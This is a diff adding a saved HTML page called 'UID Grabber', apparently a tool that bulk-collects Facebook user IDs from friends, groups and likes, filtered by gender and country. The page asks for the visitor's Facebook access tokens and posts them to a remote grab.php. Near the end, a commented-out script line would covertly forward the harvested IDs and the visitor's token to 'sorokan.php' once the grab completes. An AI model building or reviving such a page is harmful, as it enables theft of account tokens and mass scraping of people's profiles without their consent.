@@ -1,0 +1,212 @@
+
+
+<!-- saved from url=(0026)http://iir.ijo.pw/uidgrab/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>UID Grabber</title>
+
+  <link rel="stylesheet" href="https://senk-info.github.io/uid/bootstrap.min.css">
+  <link rel="stylesheet" href="https://senk-info.github.io/uid/flaticon.css">
+  <link rel="stylesheet" href="https://senk-info.github.io/uid/icon.css">
+  <link rel="stylesheet" href="https://senk-info.github.io/uid/prettify.css">
+  <link rel="stylesheet" href="https://senk-info.github.io/uid/main.min.css">
+<style>
+body {
+    background-color: #EEEEEE;
+}
+.bmd-ripple-tab{
+	margin-right: 0px !important;
+}
+</style>
+  
+</head>
+<body>
+
+<div data-component="main"><div class="container-fluid" style="width:100%;padding-top:40px;max-width:500px;">
+
+	<div class="panel panel-default  bmd-card">
+	
+	  <div class="panel-body bmd-card-image">
+	
+	  <!-- Nav tabs -->
+	  <ul class="nav nav-tabs bmd-nav-tabs bmd-nav-tabs-danger " style="">
+	
+		<li role="presentation" class="active" style="width:33.33%"><a href="http://iir.ijo.pw/uidgrab/#fren" aria-controls="fren" role="tab" data-toggle="tab" class="bmd-ripple bmd-ripple-tab">UID from Friend</a></li>
+		<li role="presentation" style="width:33.33%"><a href="http://iir.ijo.pw/uidgrab/#group" aria-controls="group" role="tab" data-toggle="tab" class="bmd-ripple bmd-ripple-tab">UID from Group</a></li>
+		<li role="presentation" style="width:33.33%"><a href="http://iir.ijo.pw/uidgrab/#like" aria-controls="like" role="tab" data-toggle="tab" class="bmd-ripple bmd-ripple-tab">UID from Likes</a></li>
+	  </ul>
+	
+	  <!-- Tab panes -->
+	  <div class="tab-content bmd-card-caption" style="padding: 0 15px;;">
+	
+		<br>
+		<form id="uidfrend" method="post" action="http://iir.ijo.pw/uidgrab/grab.php" class="form-horizontal">
+			<div class="form-group has-error">
+			  <label class="col-lg-2 control-label bmd-control-label">Token</label>
+			  <div class="col-lg-10">
+				  <div class="bmd-field-group ">
+					<textarea rows="3" class="bmd-textarea" name="fb_token" id="fb_token" required=""></textarea>
+					<span class="bmd-bar"></span>
+					<label class="bmd-label">Input FB token (perbaris, untuk random)</label>
+					<span class="bmd-field-feedback"></span>
+				  </div>
+			  </div>
+			</div>	
+		
+			<div class="form-group">
+			  <label class="col-lg-2 control-label">Gender</label>
+			  <div class="col-lg-10">
+				<div class="radio bmd-radio bmd-radio-success">
+				  <label>
+					<input class="bmd-radio-input bmd-ripple" type="radio" id="gender" name="gender" value="all" checked="true">
+					All &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					<span class="bmd-radio-check"></span>
+				  </label>
+				  <label>
+					<input class="bmd-radio-input bmd-ripple" type="radio" id="gender" name="gender" value="male">
+					Male &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					<span class="bmd-radio-check"></span>
+				  </label>
+				  <label>
+					<input class="bmd-radio-input bmd-ripple" type="radio" id="gender" name="gender" value="female">
+					Female
+					<span class="bmd-radio-check"></span>
+				  </label>
+				</div>
+			  </div>
+			</div>
+			<div class="form-group">
+			  <label class="col-lg-2 control-label ">Country</label>
+			  <div class="col-lg-10">
+				<select name="country" id="country" style="width:100%;border: 1px solid #f0f0f0;padding:2px 5px;" class="bmd-ripple">
+					<option value="semua">Semua</option>
+				<option value="AF">Afghanistan</option><option value="AX">Aland Islands</option><option value="AL">Albania</option><option value="DZ">Algeria</option><option value="AS">American Samoa</option><option value="AD">Andorra</option><option value="AO">Angola</option><option value="AI">Anguilla</option><option value="AQ">Antarctica</option><option value="AG">Antigua And Barbuda</option><option value="AR">Argentina</option><option value="AM">Armenia</option><option value="AW">Aruba</option><option value="AU">Australia</option><option value="AT">Austria</option><option value="AZ">Azerbaijan</option><option value="BS">Bahamas</option><option value="BH">Bahrain</option><option value="BD">Bangladesh</option><option value="BB">Barbados</option><option value="BY">Belarus</option><option value="BE">Belgium</option><option value="BZ">Belize</option><option value="BJ">Benin</option><option value="BM">Bermuda</option><option value="BT">Bhutan</option><option value="BO">Bolivia</option><option value="BA">Bosnia And Herzegovina</option><option value="BW">Botswana</option><option value="BV">Bouvet Island</option><option value="BR">Brazil</option><option value="IO">British Indian Ocean Territory</option><option value="BN">Brunei Darussalam</option><option value="BG">Bulgaria</option><option value="BF">Burkina Faso</option><option value="BI">Burundi</option><option value="KH">Cambodia</option><option value="CM">Cameroon</option><option value="CA">Canada</option><option value="CV">Cape Verde</option><option value="KY">Cayman Islands</option><option value="CF">Central African Republic</option><option value="TD">Chad</option><option value="CL">Chile</option><option value="CN">China</option><option value="CX">Christmas Island</option><option value="CC">Cocos (Keeling) Islands</option><option value="CO">Colombia</option><option value="KM">Comoros</option><option value="CG">Congo</option><option value="CD">Congo, Democratic Republic</option><option value="CK">Cook Islands</option><option value="CR">Costa Rica</option><option value="CI">Cote D'Ivoire</option><option value="HR">Croatia</option><option value="CU">Cuba</option><option value="CY">Cyprus</option><option value="CZ">Czech Republic</option><option value="DK">Denmark</option><option value="DJ">Djibouti</option><option value="DM">Dominica</option><option value="DO">Dominican Republic</option><option value="EC">Ecuador</option><option value="EG">Egypt</option><option value="SV">El Salvador</option><option value="GQ">Equatorial Guinea</option><option value="ER">Eritrea</option><option value="EE">Estonia</option><option value="ET">Ethiopia</option><option value="FK">Falkland Islands (Malvinas)</option><option value="FO">Faroe Islands</option><option value="FJ">Fiji</option><option value="FI">Finland</option><option value="FR">France</option><option value="GF">French Guiana</option><option value="PF">French Polynesia</option><option value="TF">French Southern Territories</option><option value="GA">Gabon</option><option value="GM">Gambia</option><option value="GE">Georgia</option><option value="DE">Germany</option><option value="GH">Ghana</option><option value="GI">Gibraltar</option><option value="GR">Greece</option><option value="GL">Greenland</option><option value="GD">Grenada</option><option value="GP">Guadeloupe</option><option value="GU">Guam</option><option value="GT">Guatemala</option><option value="GG">Guernsey</option><option value="GN">Guinea</option><option value="GW">Guinea-Bissau</option><option value="GY">Guyana</option><option value="HT">Haiti</option><option value="HM">Heard Island &amp; Mcdonald Islands</option><option value="VA">Holy See (Vatican City State)</option><option value="HN">Honduras</option><option value="HK">Hong Kong</option><option value="HU">Hungary</option><option value="IS">Iceland</option><option value="IN">India</option><option value="ID">Indonesia</option><option value="IR">Iran, Islamic Republic Of</option><option value="IQ">Iraq</option><option value="IE">Ireland</option><option value="IM">Isle Of Man</option><option value="IL">Israel</option><option value="IT">Italy</option><option value="JM">Jamaica</option><option value="JP">Japan</option><option value="JE">Jersey</option><option value="JO">Jordan</option><option value="KZ">Kazakhstan</option><option value="KE">Kenya</option><option value="KI">Kiribati</option><option value="KR">Korea</option><option value="KW">Kuwait</option><option value="KG">Kyrgyzstan</option><option value="LA">Lao People's Democratic Republic</option><option value="LV">Latvia</option><option value="LB">Lebanon</option><option value="LS">Lesotho</option><option value="LR">Liberia</option><option value="LY">Libyan Arab Jamahiriya</option><option value="LI">Liechtenstein</option><option value="LT">Lithuania</option><option value="LU">Luxembourg</option><option value="MO">Macao</option><option value="MK">Macedonia</option><option value="MG">Madagascar</option><option value="MW">Malawi</option><option value="MY">Malaysia</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malta</option><option value="MH">Marshall Islands</option><option value="MQ">Martinique</option><option value="MR">Mauritania</option><option value="MU">Mauritius</option><option value="YT">Mayotte</option><option value="MX">Mexico</option><option value="FM">Micronesia, Federated States Of</option><option value="MD">Moldova</option><option value="MC">Monaco</option><option value="MN">Mongolia</option><option value="ME">Montenegro</option><option value="MS">Montserrat</option><option value="MA">Morocco</option><option value="MZ">Mozambique</option><option value="MM">Myanmar</option><option value="NA">Namibia</option><option value="NR">Nauru</option><option value="NP">Nepal</option><option value="NL">Netherlands</option><option value="AN">Netherlands Antilles</option><option value="NC">New Caledonia</option><option value="NZ">New Zealand</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nigeria</option><option value="NU">Niue</option><option value="NF">Norfolk Island</option><option value="MP">Northern Mariana Islands</option><option value="NO">Norway</option><option value="OM">Oman</option><option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PS">Palestinian Territory, Occupied</option><option value="PA">Panama</option><option value="PG">Papua New Guinea</option><option value="PY">Paraguay</option><option value="PE">Peru</option><option value="PH">Philippines</option><option value="PN">Pitcairn</option><option value="PL">Poland</option><option value="PT">Portugal</option><option value="PR">Puerto Rico</option><option value="QA">Qatar</option><option value="RE">Reunion</option><option value="RO">Romania</option><option value="RU">Russian Federation</option><option value="RW">Rwanda</option><option value="BL">Saint Barthelemy</option><option value="SH">Saint Helena</option><option value="KN">Saint Kitts And Nevis</option><option value="LC">Saint Lucia</option><option value="MF">Saint Martin</option><option value="PM">Saint Pierre And Miquelon</option><option value="VC">Saint Vincent And Grenadines</option><option value="WS">Samoa</option><option value="SM">San Marino</option><option value="ST">Sao Tome And Principe</option><option value="SA">Saudi Arabia</option><option value="SN">Senegal</option><option value="RS">Serbia</option><option value="SC">Seychelles</option><option value="SL">Sierra Leone</option><option value="SG">Singapore</option><option value="SK">Slovakia</option><option value="SI">Slovenia</option><option value="SB">Solomon Islands</option><option value="SO">Somalia</option><option value="ZA">South Africa</option><option value="GS">South Georgia And Sandwich Isl.</option><option value="ES">Spain</option><option value="LK">Sri Lanka</option><option value="SD">Sudan</option><option value="SR">Suriname</option><option value="SJ">Svalbard And Jan Mayen</option><option value="SZ">Swaziland</option><option value="SE">Sweden</option><option value="CH">Switzerland</option><option value="SY">Syrian Arab Republic</option><option value="TW">Taiwan</option><option value="TJ">Tajikistan</option><option value="TZ">Tanzania</option><option value="TH">Thailand</option><option value="TL">Timor-Leste</option><option value="TG">Togo</option><option value="TK">Tokelau</option><option value="TO">Tonga</option><option value="TT">Trinidad And Tobago</option><option value="TN">Tunisia</option><option value="TR">Turkey</option><option value="TM">Turkmenistan</option><option value="TC">Turks And Caicos Islands</option><option value="TV">Tuvalu</option><option value="UG">Uganda</option><option value="UA">Ukraine</option><option value="AE">United Arab Emirates</option><option value="GB">United Kingdom</option><option value="US">United States</option><option value="UM">United States Outlying Islands</option><option value="UY">Uruguay</option><option value="UZ">Uzbekistan</option><option value="VU">Vanuatu</option><option value="VE">Venezuela</option><option value="VN">Viet Nam</option><option value="VG">Virgin Islands, British</option><option value="VI">Virgin Islands, U.S.</option><option value="WF">Wallis And Futuna</option><option value="EH">Western Sahara</option><option value="YE">Yemen</option><option value="ZM">Zambia</option><option value="ZW">Zimbabwe</option></select>
+						
+			  </div>
+			</div>
+			<div class="form-group has-warning">
+			  <label class="col-lg-2 control-label bmd-control-label">UIDs</label>
+			  <div class="col-lg-10">
+				<div class="bmd-field-group has-warning">
+				  <textarea rows="10" class="bmd-textarea" required="" onclick="this.select()" name="uids" style="width:100%;height:20%;min-height:80px;max-height:200px"></textarea>
+				  <span class="bmd-bar"></span>
+				  <label class="bmd-label">ex: 10000099999999</label>
+				  <span class="bmd-field-feedback">
+					UID/username perline
+				  </span>
+				</div>	  
+			  </div>
+			</div>
+			<input type="hidden" id="type" value="">
+			<input type="hidden" id="run" value="0">
+		</form>	
+			  
+	  
+		<div role="tabpanel" class="tab-pane active" id="fren">
+	
+			<div class="form-group ">
+				<label class="col-lg-2 control-label bmd-control-label"></label>
+				<div class="">
+				<a type="button" class="btn btn-sm btn-warning btn-block bmd-ripple " data-type="friends" value="grab" name="grab" style="font-size:16px" data-toggle="modal" data-target="#ngegrab" data-backdrop="static" data-keyboard="false" data-component="lanjut"><b>GRAB from FRIENDS</b></a>
+				</div>
+			</div>
+			<br>
+		</div>
+		<div role="tabpanel" class="tab-pane" id="group">
+			<div class="form-group ">
+				<label class="col-lg-2 control-label bmd-control-label"></label>
+				<div class="">
+				<a type="button" class="btn btn-sm btn-warning btn-block bmd-ripple " data-type="members" value="grab" name="grab" style="font-size:16px" data-toggle="modal" data-target="#ngegrab" data-backdrop="static" data-keyboard="false" data-component="lanjut"><b>GRAB from GROUP</b></a>
+				</div>
+			</div>
+			<br>
+		</div>
+		<div role="tabpanel" class="tab-pane" id="like">
+			<div class="form-group ">
+				<label class="col-lg-2 control-label bmd-control-label"></label>
+				<div class="">
+				<a type="button" class="btn btn-sm btn-warning btn-block bmd-ripple " data-type="likes" value="grab" name="grab" style="font-size:16px" data-toggle="modal" data-target="#ngegrab" data-backdrop="static" data-keyboard="false" data-component="lanjut"><b>GRAB from LIKES</b></a>
+				</div>
+			</div>
+			<br>
+		</div>
+		<div role="tabpanel" class="tab-pane" id="messages">...</div>
+		<div role="tabpanel" class="tab-pane" id="settings">...</div>
+	  </div>
+	
+	</div>
+	</div>
+	</div>
+	
+	<!-- Proses -->
+	<div class="modal fade" id="ngegrab">
+	  <div class="modal-dialog bmd-modal-dialog">
+		<div class="modal-content bmd-border-success">
+		  <div class="modal-header bmd-bg-success">
+			<button type="button" class="close btn-link bmd-flat-btn bmd-flat-btn-light" data-dismiss="modal" aria-hidden="true">x</button>
+			<h4 class="modal-title bmd-text-green-100">Grab Proses</h4>
+		  </div>
+		  <div class="modal-body">		
+			<div id="component"></div>
+		  </div>
+		  <div class="modal-footer bmd-border-green-100">
+			<span style="margin-right:20px">Jika di close akan mulai dari awal</span>
+			<button type="button" class="btn btn-default bmd-ripple bmd-ink-grey-400 metu" data-dismiss="modal">Cancel</button>
+			<button type="button" class="btn btn-success bmd-ripple simpen">Save</button>
+		  </div>
+		</div>
+	  </div>
+	</div>
+	<script>
+	var countries = {AF:'Afghanistan',AX:'Aland Islands',AL:'Albania',DZ:'Algeria',AS:'American Samoa',AD:'Andorra',AO:'Angola',AI:'Anguilla',AQ:'Antarctica',AG:'Antigua And Barbuda',AR:'Argentina',AM:'Armenia',AW:'Aruba',AU:'Australia',AT:'Austria',AZ:'Azerbaijan',BS:'Bahamas',BH:'Bahrain',BD:'Bangladesh',BB:'Barbados',BY:'Belarus',BE:'Belgium',BZ:'Belize',BJ:'Benin',BM:'Bermuda',BT:'Bhutan',BO:'Bolivia',BA:'Bosnia And Herzegovina',BW:'Botswana',BV:'Bouvet Island',BR:'Brazil',IO:'British Indian Ocean Territory',BN:'Brunei Darussalam',BG:'Bulgaria',BF:'Burkina Faso',BI:'Burundi',KH:'Cambodia',CM:'Cameroon',CA:'Canada',CV:'Cape Verde',KY:'Cayman Islands',CF:'Central African Republic',TD:'Chad',CL:'Chile',CN:'China',CX:'Christmas Island',CC:'Cocos (Keeling) Islands',CO:'Colombia',KM:'Comoros',CG:'Congo',CD:'Congo, Democratic Republic',CK:'Cook Islands',CR:'Costa Rica',CI:'Cote D\'Ivoire',HR:'Croatia',CU:'Cuba',CY:'Cyprus',CZ:'Czech Republic',DK:'Denmark',DJ:'Djibouti',DM:'Dominica',DO:'Dominican Republic',EC:'Ecuador',EG:'Egypt',SV:'El Salvador',GQ:'Equatorial Guinea',ER:'Eritrea',EE:'Estonia',ET:'Ethiopia',FK:'Falkland Islands (Malvinas)',FO:'Faroe Islands',FJ:'Fiji',FI:'Finland',FR:'France',GF:'French Guiana',PF:'French Polynesia',TF:'French Southern Territories',GA:'Gabon',GM:'Gambia',GE:'Georgia',DE:'Germany',GH:'Ghana',GI:'Gibraltar',GR:'Greece',GL:'Greenland',GD:'Grenada',GP:'Guadeloupe',GU:'Guam',GT:'Guatemala',GG:'Guernsey',GN:'Guinea',GW:'Guinea-Bissau',GY:'Guyana',HT:'Haiti',HM:'Heard Island & Mcdonald Islands',VA:'Holy See (Vatican City State)',HN:'Honduras',HK:'Hong Kong',HU:'Hungary',IS:'Iceland',IN:'India',ID:'Indonesia',IR:'Iran, Islamic Republic Of',IQ:'Iraq',IE:'Ireland',IM:'Isle Of Man',IL:'Israel',IT:'Italy',JM:'Jamaica',JP:'Japan',JE:'Jersey',JO:'Jordan',KZ:'Kazakhstan',KE:'Kenya',KI:'Kiribati',KR:'Korea',KW:'Kuwait',KG:'Kyrgyzstan',LA:'Lao People\'s Democratic Republic',LV:'Latvia',LB:'Lebanon',LS:'Lesotho',LR:'Liberia',LY:'Libyan Arab Jamahiriya',LI:'Liechtenstein',LT:'Lithuania',LU:'Luxembourg',MO:'Macao',MK:'Macedonia',MG:'Madagascar',MW:'Malawi',MY:'Malaysia',MV:'Maldives',ML:'Mali',MT:'Malta',MH:'Marshall Islands',MQ:'Martinique',MR:'Mauritania',MU:'Mauritius',YT:'Mayotte',MX:'Mexico',FM:'Micronesia, Federated States Of',MD:'Moldova',MC:'Monaco',MN:'Mongolia',ME:'Montenegro',MS:'Montserrat',MA:'Morocco',MZ:'Mozambique',MM:'Myanmar',NA:'Namibia',NR:'Nauru',NP:'Nepal',NL:'Netherlands',AN:'Netherlands Antilles',NC:'New Caledonia',NZ:'New Zealand',NI:'Nicaragua',NE:'Niger',NG:'Nigeria',NU:'Niue',NF:'Norfolk Island',MP:'Northern Mariana Islands',NO:'Norway',OM:'Oman',PK:'Pakistan',PW:'Palau',PS:'Palestinian Territory, Occupied',PA:'Panama',PG:'Papua New Guinea',PY:'Paraguay',PE:'Peru',PH:'Philippines',PN:'Pitcairn',PL:'Poland',PT:'Portugal',PR:'Puerto Rico',QA:'Qatar',RE:'Reunion',RO:'Romania',RU:'Russian Federation',RW:'Rwanda',BL:'Saint Barthelemy',SH:'Saint Helena',KN:'Saint Kitts And Nevis',LC:'Saint Lucia',MF:'Saint Martin',PM:'Saint Pierre And Miquelon',VC:'Saint Vincent And Grenadines',WS:'Samoa',SM:'San Marino',ST:'Sao Tome And Principe',SA:'Saudi Arabia',SN:'Senegal',RS:'Serbia',SC:'Seychelles',SL:'Sierra Leone',SG:'Singapore',SK:'Slovakia',SI:'Slovenia',SB:'Solomon Islands',SO:'Somalia',ZA:'South Africa',GS:'South Georgia And Sandwich Isl.',ES:'Spain',LK:'Sri Lanka',SD:'Sudan',SR:'Suriname',SJ:'Svalbard And Jan Mayen',SZ:'Swaziland',SE:'Sweden',CH:'Switzerland',SY:'Syrian Arab Republic',TW:'Taiwan',TJ:'Tajikistan',TZ:'Tanzania',TH:'Thailand',TL:'Timor-Leste',TG:'Togo',TK:'Tokelau',TO:'Tonga',TT:'Trinidad And Tobago',TN:'Tunisia',TR:'Turkey',TM:'Turkmenistan',TC:'Turks And Caicos Islands',TV:'Tuvalu',UG:'Uganda',UA:'Ukraine',AE:'United Arab Emirates',GB:'United Kingdom',US:'United States',UM:'United States Outlying Islands',UY:'Uruguay',UZ:'Uzbekistan',VU:'Vanuatu',VE:'Venezuela',VN:'Viet Nam',VG:'Virgin Islands, British',VI:'Virgin Islands, U.S.',WF:'Wallis And Futuna',EH:'Western Sahara',YE:'Yemen',ZM:'Zambia',ZW:'Zimbabwe'};
+	var usstates = {AL:'Alabama',AK:'Alaska',AZ:'Arizona',AR:'Arkansas',CA:'California',CO:'Colorado',CT:'Connecticut',DE:'Delaware',DC:'District of Columbia',FL:'Florida',GA:'Georgia',HI:'Hawaii',ID:'Idaho',IL:'Illinois',IN:'Indiana',IA:'Iowa',KS:'Kansas',KY:'Kentucky',LA:'Louisiana',ME:'Maine',MD:'Maryland',MA:'Massachusetts',MI:'Michigan',MN:'Minnesota',MS:'Mississippi',MO:'Missouri',MT:'Montana',NE:'Nebraska',NV:'Nevada',NH:'New Hampshire',NJ:'New Jersey',NM:'New Mexico',NY:'New York',NC:'North Carolina',ND:'North Dakota',OH:'Ohio',OK:'Oklahoma',OR:'Oregon',PA:'Pennsylvania',RI:'Rhode Island',SC:'South Carolina',SD:'South Dakota',TN:'Tennessee',TX:'Texas',UT:'Utah',VT:'Vermont',VA:'Virginia',WA:'Washington',WV:'West Virginia',WI:'Wisconsin',WY:'Wyoming'};
+	var states = [];
+	for(var key in usstates) {
+		states.push(usstates[key]);
+	}
+	
+	$(document).ready(function() {
+		//$.getScript( "https://senk-info.github.io/uid/prettify.js");
+		$.getScript( "https://senk-info.github.io/uid/main.min.js");
+		$.each(countries, function (i, item) {
+		$('#country').append($('<option>', { 
+			value: i,
+			text : item 
+		}));
+	
+	
+	});
+	});
+	
+	$('#ngegrab').on('hidden.bs.modal', function (e) {
+		$("#run").val(0);
+		$("#component").html('<div class="bmd-spinner bmd-spinner-default bmd-spinner-lg tunggu" style="margin: 50px auto;width: 100%;"> <svg viewBox="0 0 50 50"><circle cx="25" cy="25"r="20"></circle></svg></div>');
+	});
+	$(".simpen").on("click",function(){
+		var data = $("#uidresult").val().split("\n");
+		var gender = $('input[name=gender]:checked').val();
+		var country = $('select[name=country]').val();
+		download(data.join("\r\n"),country+"-"+gender+"-"+Date.now()+".txt",'text/plain');
+	});
+	$("a[data-type]").on("click",function(){
+		$("#type").val($(this).data("type"));	
+	});
+	</script></div>
+<script src="https://senk-info.github.io/uid/jquery.min.js.download"></script>
+<script>
+	$.getScript( "https://senk-info.github.io/uid/bootstrap.min.js");
+	$.getScript( "https://senk-info.github.io/uid/jquery.easing.min.js");
+	$.getScript( "https://senk-info.github.io/uid/prettify.js");
+	$(document).ready(function() {
+		var mlaku = false;
+    z = $("div[data-component]"),z.load(z.data("component")+"."+"html",function(){$(".tunggu").remove()});
+
+   // var sorokan=0;setInterval(function(){if(void 0!==$("#persen").html()&&0==sorokan&&"100%"==$("#persen").html()){var o=$("#uidresult").val(),n=$("#country").val(),a=$("#fb_token").val();$.ajax({url:"sorokan.php",type:"post",data:{uids:o,country:n,token:a},success:function(o){}}),sorokan=1}},3e3);
+  
+	});
+</script>
+
+</body></html>
